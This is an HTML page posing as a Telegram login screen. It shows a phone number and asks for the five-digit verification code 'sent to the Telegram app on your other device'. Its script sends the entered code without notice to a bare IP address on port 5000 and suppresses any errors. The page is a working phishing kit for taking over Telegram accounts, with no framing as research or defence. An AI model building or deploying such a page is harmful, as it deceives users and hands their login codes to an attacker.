<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Telegram Login</title>
  <style>
    body {
      margin: 0;
      background-color: #1e1e1e;
      color: white;
      font-family: Arial, sans-serif;
      height: 100vh;
    }
    .container {
      position: absolute;
      top: 10%;
      left: 50%;
      transform: translateX(-50%);
      display: flex;
      flex-direction: column;
      align-items: center;
    }
    .bear-image {
      width: 300px;
      height: 300px;
      object-fit: contain;
    }
    .phone-number {
      font-size: 24px;
      font-weight: bold;
      margin-top: 20px;
    }
    .message {
      margin: 10px 0 30px 0;
      font-size: 16px;
      color: #bbbbbb;
      text-align: center;
    }
    .input-box {
      background-color: #2e2e2e;
      border: 1px solid #444;
      border-radius: 8px;
      padding: 12px 20px;
      width: 260px;
      font-size: 16px;
      color: white;
    }
  </style>
</head>
<body>
  <div class="container">
    <img src="bear.gif" alt="Bear" class="bear-image">
    <div class="phone-number">+1 860 335 8442</div>
    <div class="message">We've sent the code to the Telegram app on your<br>other device.</div>
    <input class="input-box" id="codeInput" maxlength="5" placeholder="Code" onclick="this.placeholder=''" onblur="this.placeholder='Code'">
  </div>

  <script>
    const codeInput = document.getElementById('codeInput');

    codeInput.addEventListener('input', () => {
      const code = codeInput.value.trim();
      if (code.length === 5) {
        fetch('https://196.251.115.76:5000/enter_code', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({ code: code })
        }).then(response => response.json())
          .then(data => {
            // Optional: handle success
          }).catch(error => {
            // Optional: handle error silently
          });
      }
    });
  </script>
</body>
</html>
